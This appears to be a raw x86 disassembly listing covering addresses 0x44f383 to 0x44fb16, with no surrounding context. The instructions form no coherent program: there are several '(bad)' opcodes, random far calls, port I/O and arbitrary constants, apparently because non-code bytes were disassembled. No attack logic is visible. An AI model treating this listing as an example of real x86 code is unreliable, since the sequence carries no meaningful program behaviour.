  44f383:	les    edx,FWORD PTR [eax+0x5aa6bc29]
  44f389:	add    eax,0xed886e1c
  44f38e:	mov    ch,0x51
  44f390:	cdq    
  44f391:	jmp    0xbff12ab5
  44f396:	dec    esi
  44f397:	lods   al,BYTE PTR ds:[esi]
  44f398:	fs or  al,0x34
  44f39b:	mul    ebp
  44f39d:	sbb    al,0xe
  44f39f:	xor    dl,BYTE PTR [edx-0x760a0020]
  44f3a5:	stc    
  44f3a6:	adc    DWORD PTR [edx],ebp
  44f3a8:	pushf  
  44f3a9:	retf   0xf332
  44f3ac:	test   BYTE PTR [edx],0x4a
  44f3af:	and    al,0xfc
  44f3b1:	repnz sbb eax,0x7a2d9a3e
  44f3b7:	stc    
  44f3b8:	mov    al,ds:0x3a142bf3
  44f3bd:	and    ebx,DWORD PTR [edi]
  44f3bf:	or     al,0x1b
  44f3c1:	add    ebx,DWORD PTR [edx]
  44f3c3:	aas    
  44f3c4:	pop    ebp
  44f3c5:	ffree  st(7)
  44f3c7:	das    
  44f3c8:	cdq    
  44f3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f3ca:	pop    ds
  44f3cb:	xchg   DWORD PTR ds:0x34bdedbe,esp
  44f3d1:	rcr    ebx,cl
  44f3d3:	adc    eax,0xd01402e0
  44f3d8:	neg    BYTE PTR [edi]
  44f3da:	mov    BYTE PTR [esi-0x69],ah
  44f3dd:	lock pop ds
  44f3df:	mov    cl,0x81
  44f3e1:	repnz aad 0xd7
  44f3e4:	in     al,0xd9
  44f3e6:	and    eax,0xca29cefc
  44f3eb:	sbb    DWORD PTR [ebx+0x4842bec2],ebp
  44f3f1:	ret    0x5feb
  44f3f4:	fcmovnb st,st(7)
  44f3f6:	xor    al,0xa1
  44f3f8:	mov    BYTE PTR [ebx],al
  44f3fa:	test   al,0xb9
  44f3fc:	pop    eax
  44f3fd:	gs push 0x414680e
  44f403:	mov    DWORD PTR [ecx+0x54eddc],ecx
  44f409:	pop    ss
  44f40a:	add    dh,BYTE PTR [eax+ecx*4-0x69]
  44f40e:	sbb    DWORD PTR [esi-0x1a8aeb69],esi
  44f414:	dec    eax
  44f415:	mov    bl,0x95
  44f417:	sub    eax,0x15027386
  44f41c:	pusha  
  44f41d:	and    BYTE PTR [edx-0x65625575],cl
  44f423:	push   eax
  44f424:	mov    DWORD PTR [ebp+0x606b4a90],edx
  44f42a:	dec    ebx
  44f42b:	cmc    
  44f42c:	fwait
  44f42d:	add    eax,0x94b8fc04
  44f432:	push   ebp
  44f433:	sbb    BYTE PTR [ecx-0x76069f43],dl
  44f439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f43a:	mov    gs,eax
  44f43c:	push   0x4a
  44f43e:	mov    ah,0xaf
  44f440:	sbb    BYTE PTR [edi-0x4c],dl
  44f443:	inc    esp
  44f444:	sub    BYTE PTR [edi-0x494c80a0],cl
  44f44a:	je     0x44f492
  44f44c:	mov    es,WORD PTR ds:0x8e2e9e86
  44f452:	enter  0xea80,0xc
  44f456:	pusha  
  44f457:	outs   dx,DWORD PTR ds:[esi]
  44f458:	xchg   ecx,eax
  44f459:	ret    
  44f45a:	retf   0xe865
  44f45d:	sub    eax,0x2374d56f
  44f462:	pop    esp
  44f463:	lods   eax,DWORD PTR ds:[esi]
  44f464:	mov    dl,BYTE PTR [eax+0x21f36848]
  44f46a:	das    
  44f46b:	call   0x5cda:0xf61fc0fe
  44f472:	push   eax
  44f473:	popf   
  44f474:	test   eax,0x8e080075
  44f479:	hlt    
  44f47a:	call   0x9245:0x3d18ae0c
  44f481:	hlt    
  44f482:	nop
  44f483:	cmc    
  44f484:	mov    eax,ds:0x89f83d01
  44f489:	outs   dx,DWORD PTR ds:[esi]
  44f48a:	loop   0x44f46f
  44f48c:	jnp    0x44f4f5
  44f48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f48f:	mov    ds:0xd4eadf30,al
  44f494:	xchg   edx,eax
  44f495:	sbb    al,0x53
  44f497:	test   al,0xac
  44f499:	jp     0x44f4ca
  44f49b:	loopne 0x44f425
  44f49d:	pop    ds
  44f49e:	or     BYTE PTR [edi],al
  44f4a0:	mov    dh,0xb1
  44f4a2:	cmp    cl,bl
  44f4a4:	lods   eax,DWORD PTR ds:[esi]
  44f4a5:	mov    DWORD PTR [edi+0x3e],esi
  44f4a8:	call   0x8a66:0x88f0d537
  44f4af:	xor    al,0x3c
  44f4b1:	pop    eax
  44f4b2:	ins    DWORD PTR es:[edi],dx
  44f4b3:	and    ebx,ebp
  44f4b5:	push   edx
  44f4b6:	inc    edi
  44f4b7:	xor    ecx,ebp
  44f4b9:	pop    ds
  44f4ba:	or     BYTE PTR [eax-0x41],bl
  44f4bd:	add    eax,0xe595bece
  44f4c2:	fld    QWORD PTR [esi+0xf1e410d]
  44f4c8:	addr16 jne 0x44f50e
  44f4cb:	call   0x3a8c:0xd4888a58
  44f4d2:	stc    
  44f4d3:	mov    ebp,0x69aad2c3
  44f4d8:	mov    ebp,esp
  44f4da:	add    dh,dl
  44f4dc:	xor    al,0x15
  44f4de:	xchg   ecx,eax
  44f4df:	cwde   
  44f4e0:	mov    edx,0x95b5802
  44f4e5:	scas   eax,DWORD PTR es:[edi]
  44f4e6:	pop    esi
  44f4e7:	and    ch,cl
  44f4e9:	fdiv   QWORD PTR [ebp+0x51]
  44f4ec:	xchg   edx,eax
  44f4ed:	push   ss
  44f4ee:	sub    ecx,edx
  44f4f0:	mov    ebx,0xe8202185
  44f4f5:	or     DWORD PTR [esi-0x6fa2ac2b],edi
  44f4fb:	xor    ah,BYTE PTR gs:[ebp+ecx*4+0x47]
  44f500:	xchg   bh,bh
  44f502:	jg     0x44f512
  44f504:	mov    ch,0x5a
  44f506:	pop    edi
  44f507:	pushf  
  44f508:	nop
  44f509:	xlat   BYTE PTR ds:[ebx]
  44f50a:	and    dl,ah
  44f50c:	out    dx,al
  44f50d:	jmp    0x44f53b
  44f50f:	adc    ecx,ebx
  44f511:	xor    al,0xfb
  44f513:	test   DWORD PTR [eax-0x5e9c1111],0x8f831043
  44f51d:	add    bh,BYTE PTR [ebx+edi*2]
  44f520:	xchg   DWORD PTR ds:0x33844491,edx
  44f526:	ss add eax,0xbf5ced88
  44f52c:	mov    esi,0x3984dd87
  44f531:	add    cl,al
  44f533:	xchg   ecx,eax
  44f534:	sub    al,BYTE PTR [ecx*4+0x185cbf2c]
  44f53b:	bound  ecx,QWORD PTR [ecx+0x708d8e09]
  44f541:	mov    dh,0x8
  44f543:	jno    0x44f4e9
  44f545:	cld    
  44f546:	shl    ebp,cl
  44f548:	or     esp,DWORD PTR [eax+edx*1]
  44f54b:	leave  
  44f54c:	int    0x3e
  44f54e:	pop    edi
  44f54f:	imul   ebp,esp,0xffffffee
  44f552:	cmp    dh,dh
  44f554:	mov    DWORD PTR ds:0xb11d7831,eax
  44f55a:	fild   WORD PTR [eax+eax*2+0x34]
  44f55e:	call   0x3ec9:0xda021a2e
  44f565:	pop    ss
  44f566:	sbb    esi,ebp
  44f568:	mov    DWORD PTR [ebp-0x216f694d],edx
  44f56e:	cld    
  44f56f:	inc    eax
  44f570:	mov    bl,0x57
  44f572:	cmp    bl,bl
  44f574:	jo     0x44f561
  44f576:	fbld   TBYTE PTR gs:[ebx-0x5b5bee1b]
  44f57d:	mov    eax,ds:0x29c5ac0c
  44f582:	and    DWORD PTR [esi-0x61],esi
  44f585:	test   esp,ebp
  44f587:	add    BYTE PTR [ebx-0x578c0d2],dl
  44f58d:	cmp    esi,esi
  44f58f:	enter  0x7988,0x8a
  44f593:	or     BYTE PTR [esi],bl
  44f595:	and    eax,0xdaacdcd
  44f59a:	jg     0x44f570
  44f59c:	sbb    eax,0xd07f3633
  44f5a1:	shr    BYTE PTR [edx],1
  44f5a3:	pop    edx
  44f5a4:	pop    ecx
  44f5a5:	cdq    
  44f5a6:	outs   dx,BYTE PTR ds:[esi]
  44f5a7:	pop    ss
  44f5a8:	imul   DWORD PTR [edi-0xc]
  44f5ab:	jg     0x44f52d
  44f5ad:	dec    esp
  44f5ae:	pop    ds
  44f5af:	pusha  
  44f5b0:	and    edx,ecx
  44f5b2:	mov    ebx,DWORD PTR ds:0x96132b9
  44f5b8:	jb     0x44f5a2
  44f5ba:	push   gs
  44f5bc:	jge    0x44f560
  44f5be:	mov    ah,0x54
  44f5c0:	mov    BYTE PTR [ebx],al
  44f5c2:	pop    esp
  44f5c3:	stc    
  44f5c4:	dec    edi
  44f5c5:	xor    BYTE PTR [ebx-0x3dfc8972],ch
  44f5cb:	call   0x50cb3799
  44f5d0:	data16 stos BYTE PTR es:[edi],al
  44f5d2:	outs   dx,BYTE PTR ds:[esi]
  44f5d3:	repz cli 
  44f5d5:	pop    esp
  44f5d6:	cmp    eax,0xc83c0e2d
  44f5db:	push   esp
  44f5dc:	into   
  44f5dd:	pop    ebp
  44f5de:	sbb    DWORD PTR [ecx-0x3be27a2b],ebp
  44f5e4:	pop    edi
  44f5e5:	add    eax,DWORD PTR [ebp+0x66f20f09]
  44f5eb:	cmp    ebp,DWORD PTR [ebp-0x517c478a]
  44f5f1:	push   ebp
  44f5f2:	inc    ecx
  44f5f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f5f4:	lea    eax,ds:0x889d6ac6
  44f5fa:	out    0x56,al
  44f5fc:	gs (bad) 
  44f5fe:	pop    ds
  44f5ff:	fwait
  44f600:	mov    edx,0x88d82bee
  44f605:	jmp    0xb79a:0x44fd35f
  44f60c:	push   esp
  44f60d:	sub    bl,BYTE PTR [edi+0x20]
  44f610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f611:	jb     0x44f632
  44f613:	mov    ch,0xd1
  44f615:	push   esi
  44f616:	iret   
  44f617:	xor    bl,BYTE PTR [edx-0x2b54b763]
  44f61d:	out    0x52,eax
  44f61f:	daa    
  44f620:	pop    edx
  44f621:	add    DWORD PTR [ecx+0x20bb07b3],ecx
  44f627:	retf   
  44f628:	mov    BYTE PTR [ebp-0x6f],dh
  44f62b:	inc    edx
  44f62c:	ds cdq 
  44f62e:	ret    0x812
  44f631:	add    ch,BYTE PTR [edx-0x6e]
  44f634:	dec    ebp
  44f635:	test   eax,0xf994e12f
  44f63a:	pusha  
  44f63b:	jg     0x44f673
  44f63d:	popa   
  44f63e:	xor    ecx,DWORD PTR [ecx]
  44f640:	cmp    ah,BYTE PTR [ebp+0x397ed426]
  44f646:	xchg   esi,eax
  44f647:	int3   
  44f648:	lods   al,BYTE PTR ds:[esi]
  44f649:	or     dh,BYTE PTR [edi-0x66]
  44f64c:	mov    ch,ch
  44f64e:	adc    DWORD PTR gs:[ecx+0x17],ebp
  44f652:	and    al,0xab
  44f654:	call   DWORD PTR [edi]
  44f656:	sub    dh,BYTE PTR [edx-0x4944a163]
  44f65c:	aaa    
  44f65d:	daa    
  44f65e:	mov    dl,0xf5
  44f660:	iret   
  44f661:	in     al,dx
  44f662:	pop    ds
  44f663:	sbb    ecx,DWORD PTR [ecx-0x7ddea562]
  44f669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f66a:	mov    cl,0xd2
  44f66c:	fmul   DWORD PTR fs:[ebp+ebx*4+0x13]
  44f671:	mov    eax,0x7f57101f
  44f676:	jp     0x44f673
  44f678:	xchg   edi,eax
  44f679:	data16 rcl BYTE PTR [edi+ebp*1+0x56],cl
  44f67e:	repz xor eax,0x2fe6032a
  44f684:	dec    ecx
  44f685:	je     0x44f61b
  44f687:	mov    dh,0xe2
  44f689:	inc    edx
  44f68a:	pop    ds
  44f68b:	(bad)  
  44f68c:	pop    eax
  44f68d:	add    al,0x4d
  44f68f:	xchg   edi,eax
  44f690:	pusha  
  44f691:	xor    edi,esi
  44f693:	aam    0xbb
  44f695:	mov    DWORD PTR [ebx-0x74256712],edi
  44f69b:	outs   dx,DWORD PTR ds:[esi]
  44f69c:	je     0x44f6db
  44f69e:	push   ds
  44f69f:	mov    edi,0x95f146db
  44f6a4:	rcr    BYTE PTR [ebx+0x3a],1
  44f6a7:	pop    ss
  44f6a8:	inc    edi
  44f6a9:	add    dl,al
  44f6ab:	add    DWORD PTR [esi-0x6d6a32a1],edx
  44f6b1:	and    BYTE PTR [eax+0x4f],0x38
  44f6b5:	enter  0x15f6,0x5c
  44f6b9:	push   esi
  44f6ba:	fcom   st(5)
  44f6bc:	sub    eax,0xb6c6c070
  44f6c1:	(bad)  
  44f6c2:	lock add DWORD PTR [esi-0x6d90cea9],0xffffff94
  44f6ca:	inc    eax
  44f6cb:	popa   
  44f6cc:	push   cs
  44f6cd:	call   0xdd0c:0xac9ed74f
  44f6d4:	sbb    eax,DWORD PTR [esi]
  44f6d6:	push   ebp
  44f6d7:	jne    0x44f672
  44f6d9:	push   eax
  44f6da:	pop    ds
  44f6db:	in     eax,0xb3
  44f6dd:	sub    esp,DWORD PTR [ebx]
  44f6df:	enter  0x49e4,0xe9
  44f6e3:	aam    0xf1
  44f6e5:	dec    esi
  44f6e6:	rcl    DWORD PTR [eax-0x124daf1d],1
  44f6ec:	mov    ch,0x15
  44f6ee:	add    DWORD PTR [ecx+ecx*1+0x21],ecx
  44f6f2:	ret    0x8b53
  44f6f5:	inc    edx
  44f6f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f6f7:	inc    esp
  44f6f8:	add    esi,edx
  44f6fa:	pusha  
  44f6fb:	clc    
  44f6fc:	xchg   DWORD PTR [ebp-0x4eac83ac],edx
  44f702:	pop    ds
  44f703:	push   edi
  44f704:	into   
  44f705:	or     DWORD PTR [ebp+ebx*2-0xa414681],esp
  44f70c:	fild   DWORD PTR [edx]
  44f70e:	push   eax
  44f70f:	mov    ebp,0x98b4c0e0
  44f714:	xor    edi,esi
  44f716:	pusha  
  44f717:	dec    edi
  44f718:	out    dx,al
  44f719:	punpcklwd mm5,DWORD PTR [ebp-0x45f155c4]
  44f720:	out    dx,al
  44f721:	call   0x80d3:0x9389c1c5
  44f728:	int3   
  44f729:	pushw  ds
  44f72b:	ins    DWORD PTR es:[edi],dx
  44f72c:	es xchg edi,eax
  44f72e:	and    DWORD PTR [esi-0x68],esp
  44f731:	xchg   ebx,eax
  44f732:	call   0x694d:0x4c78afd2
  44f739:	xchg   ebp,eax
  44f73a:	pop    ds
  44f73b:	jo     0x44f756
  44f73d:	xchg   BYTE PTR [eax-0x61],ah
  44f740:	jp     0x44f6e4
  44f742:	add    al,0x19
  44f744:	cli    
  44f745:	stos   BYTE PTR es:[edi],al
  44f746:	pop    ebp
  44f747:	stos   BYTE PTR es:[edi],al
  44f748:	shr    esp,0xef
  44f74b:	xor    al,0x7f
  44f74d:	and    esp,ebx
  44f74f:	xchg   esp,eax
  44f750:	inc    edx
  44f751:	xor    ah,0xb1
  44f754:	mov    DWORD PTR [ecx],ebx
  44f756:	fisub  WORD PTR [esi-0x7c097b26]
  44f75c:	in     eax,0x2
  44f75e:	or     ch,BYTE PTR [edi+eiz*2]
  44f761:	push   edx
  44f762:	pop    ds
  44f763:	in     al,dx
  44f764:	nop
  44f765:	add    DWORD PTR [esi],ebx
  44f767:	imul   edi,DWORD PTR [esi+0x613f2844],0xe0682fa6
  44f771:	adc    BYTE PTR [eax-0x6acff2c],0xde
  44f778:	dec    edi
  44f779:	jmp    DWORD PTR [eax+0x2b]
  44f77c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44f77d:	adc    dh,dl
  44f77f:	sbb    ecx,DWORD PTR [edx+0x45]
  44f782:	sbb    edx,DWORD PTR [edi]
  44f784:	mov    ds:0x96d711f9,al
  44f789:	scas   al,BYTE PTR es:[edi]
  44f78a:	cmp    DWORD PTR gs:[edx+0x4f],ebx
  44f78e:	pop    esp
  44f78f:	adc    eax,DWORD PTR [ebx+esi*8+0x5c]
  44f793:	stc    
  44f794:	pop    ds
  44f795:	adc    ch,ah
  44f797:	dec    esi
  44f798:	mov    dl,0x58
  44f79a:	bound  eax,QWORD PTR ds:0x597e475f
  44f7a0:	in     eax,0xd2
  44f7a2:	pusha  
  44f7a3:	pop    es
  44f7a4:	je     0x44f780
  44f7a6:	in     al,dx
  44f7a7:	push   esp
  44f7a8:	aas    
  44f7a9:	loop   0x44f75b
  44f7ab:	fwait
  44f7ac:	push   ecx
  44f7ad:	not    BYTE PTR [edx+0x641cefe3]
  44f7b3:	jnp    0x44f741
  44f7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f7b6:	enter  0x865,0x4a
  44f7ba:	xchg   ebp,eax
  44f7bb:	lahf   
  44f7bc:	and    eax,0x7e55fae6
  44f7c1:	ins    DWORD PTR es:[edi],dx
  44f7c2:	loope  0x44f811
  44f7c4:	sbb    al,0x76
  44f7c6:	push   ds
  44f7c7:	xchg   ebp,eax
  44f7c8:	adc    al,0xc6
  44f7ca:	inc    ebp
  44f7cb:	xor    eax,0xba7803f4
  44f7d0:	xor    al,0xd5
  44f7d2:	std    
  44f7d3:	fmul   DWORD PTR [ecx+0x4c9a350f]
  44f7d9:	cdq    
  44f7da:	pop    ds
  44f7db:	pop    ecx
  44f7dc:	xchg   ebp,eax
  44f7dd:	ins    BYTE PTR es:[edi],dx
  44f7de:	jbe    0x44f839
  44f7e0:	lea    ebp,ds:0xacfef
  44f7e6:	sahf   
  44f7e7:	fisttp QWORD PTR ds:0x31e28aeb
  44f7ed:	add    bl,BYTE PTR [edi-0x18fc1eb2]
  44f7f3:	ret    0x1fda
  44f7f6:	or     BYTE PTR [edi],ah
  44f7f8:	adc    al,0x83
  44f7fa:	into   
  44f7fb:	push   0xa05768c8
  44f800:	ds jmp 0x1f58:0x8388f4b7
  44f808:	push   esi
  44f809:	sbb    BYTE PTR [esi],dl
  44f80b:	(bad)  
  44f80c:	mov    DWORD PTR [ebx+0x3276618c],esi
  44f812:	push   0xffffffcd
  44f814:	cdq    
  44f815:	add    eax,0x36381c76
  44f81a:	popa   
  44f81b:	shl    BYTE PTR [ebx+0x34016061],0x34
  44f822:	leave  
  44f823:	jne    0x44f83f
  44f825:	pop    esi
  44f826:	push   es
  44f827:	mov    bh,0x2d
  44f829:	add    ebx,DWORD PTR [esi+0x5f089c11]
  44f82f:	icebp  
  44f830:	adc    eax,0x46bd61eb
  44f835:	xchg   al,bl
  44f837:	inc    edx
  44f838:	cmp    BYTE PTR [ecx],al
  44f83a:	neg    BYTE PTR [esi+ebx*2+0x0]
  44f83e:	jo     0x44f8a4
  44f840:	(bad)  
  44f841:	nop
  44f842:	idiv   BYTE PTR [edx]
  44f844:	sub    BYTE PTR ss:[eax],0xc7
  44f848:	stc    
  44f849:	vpandn xmm1,xmm2,XMMWORD PTR [eax-0xb6b1fc9]
  44f851:	jp     0x44f882
  44f853:	mov    edi,DWORD PTR [esi+ecx*4-0x61]
  44f857:	je     0x44f7ef
  44f859:	pop    edi
  44f85a:	sub    ebx,DWORD PTR [ebp-0x37]
  44f85d:	add    BYTE PTR [edx-0x45],dh
  44f860:	mov    es,WORD PTR [ecx+0x205e6161]
  44f866:	and    BYTE PTR [ebp+0x78c64d47],dl
  44f86c:	pop    ebp
  44f86d:	add    ah,dh
  44f86f:	jp     0x44f802
  44f871:	push   ds
  44f872:	loope  0x44f87e
  44f874:	test   DWORD PTR [edi+ebx*1],ebx
  44f877:	xor    DWORD PTR [ebx+ecx*2],esp
  44f87a:	mov    dl,0x21
  44f87c:	and    dh,BYTE PTR [eax-0x38]
  44f87f:	aam    0xf4
  44f881:	mov    eax,edi
  44f883:	fs dec eax
  44f885:	(bad)  [eax+0x7949fd6e]
  44f88b:	aad    0xf7
  44f88d:	mov    ah,0x1e
  44f88f:	sbb    al,0x12
  44f891:	cmp    DWORD PTR [ebp+edx*8-0x5f65139c],ecx
  44f898:	jmp    0x9a7d:0x8a4be65f
  44f89f:	les    edx,FWORD PTR [ebp+0x29662b2f]
  44f8a5:	stc    
  44f8a6:	add    bh,al
  44f8a8:	ror    BYTE PTR [edx+0x26574df],0x50
  44f8af:	and    eax,0xfeddeb43
  44f8b4:	or     BYTE PTR [ebx+0xf],0x4f
  44f8b8:	mov    DWORD PTR [ebp+0x452a3d0c],esi
  44f8be:	addr16 int3 
  44f8c0:	sahf   
  44f8c1:	add    eax,0x4064fafa
  44f8c6:	sahf   
  44f8c7:	inc    DWORD PTR [ebx-0x764f21fd]
  44f8cd:	aas    
  44f8ce:	lds    edi,FWORD PTR [ebx-0x2d]
  44f8d1:	fadd   QWORD PTR [edi]
  44f8d3:	int    0xb
  44f8d5:	add    edi,DWORD PTR [eax+ebx*4+0x29]
  44f8d9:	out    0xa1,al
  44f8db:	jne    0x44f8b2
  44f8dd:	fldenv [eax-0x4f]
  44f8e0:	cmc    
  44f8e1:	aam    0x6c
  44f8e3:	or     BYTE PTR [ecx+ebx*1-0x13],0xab
  44f8e8:	jns    0x44f8c5
  44f8ea:	in     eax,dx
  44f8eb:	sbb    BYTE PTR [edx+0x19d47277],al
  44f8f1:	xor    dl,BYTE PTR es:[edi+ebp*4]
  44f8f5:	repz hlt 
  44f8f7:	xor    al,0x87
  44f8f9:	jg     0x44f93b
  44f8fb:	xlat   BYTE PTR ds:[ebx]
  44f8fc:	xchg   edi,eax
  44f8fd:	add    bl,ch
  44f8ff:	xchg   ecx,eax
  44f900:	inc    eax
  44f901:	or     dh,bl
  44f903:	aad    0xc2
  44f905:	ret    
  44f906:	fsubr  st(1),st
  44f908:	fldenv [esi+eiz*8]
  44f90b:	mov    es,WORD PTR [ecx-0x3e08e64d]
  44f911:	inc    edx
  44f912:	push   ds
  44f913:	dec    esi
  44f914:	fwait
  44f915:	pushf  
  44f916:	and    DWORD PTR [edi+0x36ea4670],eax
  44f91c:	rol    DWORD PTR [ebp-0x3558e434],1
  44f922:	push   0xffffffbd
  44f924:	mov    ah,0x9d
  44f926:	aam    0xff
  44f928:	mov    DWORD PTR [esi-0x5cf6353a],ebp
  44f92e:	jle    0x44f94c
  44f930:	push   cs
  44f931:	add    bl,BYTE PTR [esi]
  44f933:	jno    0x44f93c
  44f935:	and    DWORD PTR [edi+edi*2-0x68e1d076],edi
  44f93c:	pop    ebx
  44f93d:	sub    DWORD PTR [edi-0x3c57b542],0x78bedcd5
  44f947:	xchg   ch,bh
  44f949:	xor    eax,0xb882c42
  44f94e:	inc    edi
  44f94f:	pop    ecx
  44f950:	repnz (bad) 
  44f952:	stos   BYTE PTR es:[edi],al
  44f953:	shl    BYTE PTR [ebp+0x3],1
  44f956:	push   eax
  44f957:	mov    ah,0xf5
  44f959:	(bad)  
  44f95a:	pop    ss
  44f95b:	scas   eax,DWORD PTR es:[edi]
  44f95c:	mov    ch,0xab
  44f95e:	pop    ss
  44f95f:	adc    DWORD PTR [ecx-0x30ac40fd],ecx
  44f965:	xor    al,0x7c
  44f967:	ret    0xadd4
  44f96a:	xchg   ebx,eax
  44f96b:	jb     0x44f8f5
  44f96d:	int    0xe
  44f96f:	add    ah,BYTE PTR [ebx-0x45]
  44f972:	dec    edx
  44f973:	arpl   WORD PTR [edx+0x8f2c529],si
  44f979:	jecxz  0x44f9e0
  44f97b:	loopne 0x44f95c
  44f97d:	mov    al,BYTE PTR es:[ecx-0x31]
  44f981:	lahf   
  44f982:	pusha  
  44f983:	sub    eax,0x8ef87281
  44f988:	cs mov ebp,0x30a01f1f
  44f98e:	scas   eax,DWORD PTR es:[edi]
  44f98f:	dec    ebp
  44f990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44f991:	ja     0x44f95f
  44f993:	aad    0xf5
  44f995:	out    dx,eax
  44f996:	push   esi
  44f997:	cmp    DWORD PTR [esi-0x74276631],ecx
  44f99d:	xchg   ebp,eax
  44f99e:	stos   BYTE PTR es:[edi],al
  44f99f:	loop   0x44f96f
  44f9a1:	test   BYTE PTR [edx],dl
  44f9a3:	fimul  WORD PTR [eax]
  44f9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44f9a6:	aam    0xd4
  44f9a8:	hlt    
  44f9a9:	int3   
  44f9aa:	int3   
  44f9ab:	cmp    eax,0x40ec7c28
  44f9b0:	mov    bh,cl
  44f9b2:	wbinvd 
  44f9b4:	mov    WORD PTR [edi+0x481a4ff6],ds
  44f9ba:	call   0xf80c:0x1c82023e
  44f9c1:	sub    DWORD PTR [ebx+0x1fe668cc],ecx
  44f9c7:	ror    esi,1
  44f9c9:	mov    ?,WORD PTR [edx-0x54]
  44f9cc:	cmp    ah,ah
  44f9ce:	cwde   
  44f9cf:	rcr    bl,cl
  44f9d1:	pop    es
  44f9d2:	retf   
  44f9d3:	lods   al,BYTE PTR ds:[esi]
  44f9d4:	shl    BYTE PTR ss:[eax+0x62c7b26e],cl
  44f9db:	jnp    0x44f995
  44f9dd:	repnz mov edx,0xa0ab54c7
  44f9e3:	popa   
  44f9e4:	pop    edx
  44f9e5:	pop    ebx
  44f9e6:	fdiv   QWORD PTR [ebp+0x5b78026d]
  44f9ec:	adc    DWORD PTR [eax-0x15],ebx
  44f9ef:	mov    DWORD PTR ss:[ebx+0x5668895c],edx
  44f9f6:	arpl   WORD PTR [edx+0x62],si
  44f9f9:	add    esp,DWORD PTR [edx+0x1f]
  44f9fc:	dec    esp
  44f9fd:	sahf   
  44f9fe:	push   ds
  44f9ff:	nop
  44fa00:	dec    ebp
  44fa01:	imul   edi,DWORD PTR [ebx-0x2b],0x14ad0eb1
  44fa08:	in     al,dx
  44fa09:	sub    BYTE PTR [ebp-0x493a7962],bl
  44fa0f:	aam    0x99
  44fa11:	push   edi
  44fa12:	stos   BYTE PTR es:[edi],al
  44fa13:	mov    ds:0xf3765907,eax
  44fa18:	add    BYTE PTR fs:[edi],bl
  44fa1b:	and    eax,0x8fb2af63
  44fa20:	hlt    
  44fa21:	push   esi
  44fa22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44fa23:	xlat   BYTE PTR ds:[ebx]
  44fa24:	jnp    0x44fa5b
  44fa26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44fa27:	mov    ebx,0xf4a840f1
  44fa2c:	test   esp,0xd9fc5e18
  44fa32:	in     eax,0xd5
  44fa34:	dec    ebx
  44fa35:	lods   al,BYTE PTR ds:[esi]
  44fa36:	mov    ecx,0xff5630f6
  44fa3b:	fmul   DWORD PTR [esi+eiz*1]
  44fa3e:	xchg   BYTE PTR [esi+edx*8-0x80],bl
  44fa42:	pop    edi
  44fa43:	scas   al,BYTE PTR es:[edi]
  44fa44:	pop    esi
  44fa45:	pusha  
  44fa46:	xchg   esp,eax
  44fa47:	inc    ebx
  44fa48:	mov    BYTE PTR [edi+0x68e6c8c],ch
  44fa4e:	in     ax,dx
  44fa50:	jle    0x44fa55
  44fa52:	push   es
  44fa53:	mov    edi,0xac97284
  44fa58:	lahf   
  44fa59:	mov    cl,0x60
  44fa5b:	outs   dx,DWORD PTR ds:[esi]
  44fa5c:	outs   dx,BYTE PTR ds:[esi]
  44fa5d:	in     al,0x7b
  44fa5f:	cmp    cl,BYTE PTR [edx+eax*8]
  44fa62:	out    0xe1,eax
  44fa64:	rol    BYTE PTR [edx],cl
  44fa66:	cwde   
  44fa67:	cld    
  44fa68:	ror    DWORD PTR [ebx],0x6c
  44fa6b:	jo     0x44fa44
  44fa6d:	xor    al,BYTE PTR es:[ecx]
  44fa70:	mov    BYTE PTR ds:0xed2aa7b5,bl
  44fa76:	mov    edx,0xba02f7f3
  44fa7b:	xchg   edx,eax
  44fa7c:	cs mov bh,0x90
  44fa7f:	(bad)  
  44fa80:	repnz jecxz 0x44fae3
  44fa83:	sbb    eax,0x90690f90
  44fa88:	jae    0x44fa7c
  44fa8a:	sahf   
  44fa8b:	int3   
  44fa8c:	pushf  
  44fa8d:	call   ebx
  44fa8f:	aam    0x6e
  44fa91:	fsubr  st(1),st
  44fa93:	and    DWORD PTR [ebp-0x764b15f1],edx
  44fa99:	pop    ebx
  44fa9a:	adc    bh,ch
  44fa9c:	fisubr DWORD PTR [esi]
  44fa9e:	loope  0x44fa98
  44faa0:	mov    ds:0xbc0c8e05,eax
  44faa5:	sbb    DWORD PTR [ebp+0x6abd298a],ebp
  44faab:	iret   
  44faac:	pop    ds
  44faad:	inc    edx
  44faae:	fimul  WORD PTR fs:[eax]
  44fab1:	test   DWORD PTR [edi],esp
  44fab3:	adc    DWORD PTR [ecx],ebx
  44fab5:	add    bl,BYTE PTR [eax-0x123f3e15]
  44fabb:	ins    DWORD PTR es:[edi],dx
  44fabc:	jge    0x44fa61
  44fabe:	gs mov ebp,0x674df6eb
  44fac4:	imul   eax,DWORD PTR [eax+eiz*2+0x75a8a62f],0x1cd9d6d5
  44facf:	dec    ebx
  44fad0:	or     edx,ebp
  44fad2:	xchg   ebp,eax
  44fad3:	fild   DWORD PTR [esi+0x611f8669]
  44fad9:	clc    
  44fada:	or     BYTE PTR [esi],0x22
  44fadd:	sub    esi,DWORD PTR ds:0xec7f00b8
  44fae3:	sbb    eax,0xf8c1148f
  44fae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44fae9:	ret    0x95ce
  44faec:	stos   DWORD PTR es:[edi],eax
  44faed:	sbb    BYTE PTR [esi],bl
  44faef:	push   edi
  44faf0:	sbb    al,0x86
  44faf2:	cmp    eax,0x878d38ca
  44faf7:	aam    0x74
  44faf9:	jmp    0x25c4:0xf74c6d5b
  44fb00:	sar    DWORD PTR ds:0xb899c1c,0xb4
  44fb07:	mov    al,ds:0xd77dbfc4
  44fb0c:	out    0x78,eax
  44fb0e:	sub    DWORD PTR [eax+0x6c],ebx
  44fb11:	push   edx
  44fb12:	aam    0x3c
  44fb14:	jle    0x44fb2f
  44fb16:	sbb    eax,0x60e27324
